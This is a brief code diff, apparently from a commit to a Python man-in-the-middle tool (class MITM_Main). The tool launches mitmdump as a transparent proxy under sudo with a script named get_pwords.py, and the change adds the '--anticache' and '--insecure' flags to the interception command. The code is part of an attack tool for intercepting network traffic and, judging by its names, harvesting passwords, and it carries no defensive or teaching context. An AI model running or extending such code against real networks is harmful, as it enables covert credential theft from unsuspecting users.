@@ -35,7 +35,7 @@ class MITM_Main:
 			print("starting mitmproxy...")
 			pid3 = os.fork()
 			if pid3 > 0:
-				os.system("sudo xterm -e mitmdump -T --host -q -s 'get_pwords.py --" + idee + "' ")
+				os.system("sudo xterm -e mitmdump -T --host -q -s 'get_pwords.py --" + idee + "' --anticache --insecure")
 				os.wait()
 				os.kill(pid3, signal.SIGTERM)
 			now = datetime.datetime.now()
@@ -84,5 +84,4 @@ class MITM_Main:
 
 if __name__ == "__main__":
 	mal = MITM_Main()
-
 
